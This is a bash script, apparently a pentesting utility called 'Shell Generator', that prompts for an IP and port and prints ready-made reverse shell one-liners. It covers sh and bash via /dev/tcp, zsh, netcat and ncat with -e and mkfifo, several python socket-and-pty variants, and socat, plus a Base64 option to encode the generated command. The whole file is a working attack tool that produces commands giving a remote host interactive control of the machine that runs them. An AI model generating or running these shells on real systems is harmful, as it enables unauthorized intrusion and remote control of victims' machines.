#!/bin/bash
# Shell Generator!

red='\033[33;31m'
green='\033[33;32m'
blue='\033[33;34m'
white='\033[1;37m'
tip="[?] Use 1 to exit and 2 to check type options!"

echo -ne "$red
 
            _          __             
   |\/|    |_)  _     (_  |_   _  | | 
   |  | \/ | \ (/_ \/ __) | | (/_ | | 🐚
        /
              ⛓ By H0ru⛓
      
"
echo -e "$white"

PS3='> Type shell: '
type=(
"Exit"
"Types"
"sh"
"zsh"
"bash"
"nc -c"
"nc -e"
"nc.exe -e"
"nc mkfifo"
"ncat -e"
"ncat.exe -e"
"python x1"
"python x2"
"python3 x1"
"python3 x2"
"python3 shortest"
"socat x1"
"socat x2"
"Models Preview"
"Base64 Encode"
)
select var in "${type[@]}"; do
case $var in
"Exit")
exit
     ;;
"Types")
echo -ne "
1) Exit            3) sh             5) bash           7) nc -e          9) nc mkfifo         11) ncat.exe -e       13) python x2     15) python3 x2        17) socat x1          19) Models Preview
2) Types           4) zsh            6) nc -c          8) nc.exe -e     10) ncat -e           12) python x1         14) python3 x1    16) python3 shortest  18) socat x2          20) Base64 Encode
"
     ;;
"sh")
       echo 
       echo -e ">   🐚 ~ SH "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:

       👉 sh -i >& /dev/tcp/$ip/$door 0>&1
               "   
               echo -e "$green $tip"
               echo -e "$white"    
;; 
"zsh")
       echo 
       echo -e ">   🐚 ~ ZSH "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:

       👉 zsh -c 'zmodload zsh/net/tcp && ztcp $ip $door && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
               "
               echo -e "$green $tip"
               echo -e "$white"
       
;; 
"bash")
       echo 
       echo -e ">   🐚 ~ BASH "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:

       👉 bash -i >& /dev/tcp/$ip/$door 0>&1
               "
               echo -e "$green $tip"
               echo -e "$white"       
;; 
"nc -c")
       echo 
       echo -e ">   🐚 ~ NC -c "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 nc -c bash $ip $door
               "
               echo -e "$green $tip"
               echo -e "$white"       
;; 
"nc -e")
       echo 
       echo -e ">   🐚 ~ NC -e "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 nc $ip $door -e bash
               "
               echo -e "$green $tip"
               echo -e "$white"      
;; 
"nc.exe -e")
       echo 
       echo -e ">   🐚 ~ NC.exe -e "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 nc.exe $ip $door -e bash
               "
               echo -e "$green $tip"
               echo -e "$white"       
;; 
"nc mkfifo")
       echo 
       echo -e ">   🐚 ~ NC mkfifo "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $ip $door >/tmp/f
               "
               echo -e "$green $tip"
               echo -e "$white"       
;; 
"ncat")
       echo 
       echo -e ">   🐚 ~ NCAT "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 ncat $ip $door -e bash
               "
               echo -e "$green $tip"
               echo -e "$white"       
;; 
"ncat.exe -e")
       echo 
       echo -e ">   🐚 ~ NCAT.exe -e "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 ncat.exe $ip $door -e bash
               "
               echo -e "$green $tip"
               echo -e "$white"
;; 
"python x1")
       echo 
       echo -e ">   🐚 ~ Python x1 "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 export RHOST="$ip";export RPORT=$door;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
               "
               echo -e "$green $tip"
               echo -e "$white"     
;; 
"python x2")
       echo 
       echo -e ">   🐚 ~ Python x2 "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$door));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
               "
               echo -e "$green $tip"
               echo -e "$white"     
;; 
"python3 x1")
       echo 
       echo -e ">   🐚 ~ Python3 x1 "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 export RHOST="$ip";export RPORT=$door;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
               "
               echo -e "$green $tip"
               echo -e "$white"     
;; 
"python3 x2")
       echo 
       echo -e ">   🐚 ~ Python3 x2 "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$door));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
               "
               echo -e "$green $tip"
               echo -e "$white"     
;; 
"python3 shortest")
       echo 
       echo -e ">   🐚 ~ Python3 shortest "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("$ip",$door));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
               "
               echo -e "$green $tip"
               echo -e "$white"     
;; 
"socat x1")
       echo 
       echo -e ">   🐚 ~ Socat x1 "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 socat TCP:$ip:$door EXEC:bash
               "
               echo -e "$green $tip"
               echo -e "$white"     
;; 
"socat x2")
       echo 
       echo -e ">   🐚 ~ Socat x2 "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 socat TCP:$ip:$door EXEC:'bash',pty,stderr,setsid,sigint,sane
               "
               echo -e "$green $tip"
               echo -e "$white"     
;; 
"Models Preview")
       echo
       echo -e "$blue
                Models Preview:"
       echo -e "$white
       [*] sh >> sh -i >& /dev/tcp/#ip/#door 0>&1
       [*] zsh >> zsh -c 'zmodload zsh/net/tcp && ztcp #ip #door && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
       [*] bash >> bash -i >& /dev/tcp/#ip/#door 0>&1
       [*] nc -c >> nc -c bash #ip #door   
       [*] nc -e >> nc #ip #door -e bash
       [*] nc.exe -e >> nc.exe #ip #door -e bash
       [*] nc mkfifo >> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc #ip #door >/tmp/f
       [*] ncat -e >> ncat #ip #door -e bash
       [*] ncat.exe -e >> ncat.exe #ip #door -e bash
       [*] python x1 >> export RHOST="#ip";export RPORT=#door;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
       [*] python x2 >> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("#ip",#door));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
       [*] python3 x1 >> export RHOST="#ip";export RPORT=#door;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
       [*] python3 x2 >> python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("#ip",#door));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
       [*] python3 shortest >> python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("#ip",#door));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
       [*] socat x1 >> socat TCP:#ip:#door EXEC:bash
       [*] socat x2 >> socat TCP:#ip:#door EXEC:'bash',pty,stderr,setsid,sigint,sane
               " 
;; 
"Base64 Encode")
       echo 
       echo -e ">   Base64 Encode "
       read -p ">   🐚 ~ Your Shell: " encode
       encoded=$(echo "$encode"|base64)
       clear
       echo -e "> Shell encoded
       
       👉 $encoded
               "
               echo -e "$green $tip"
               echo -e "$white"     
;;
   esac
done
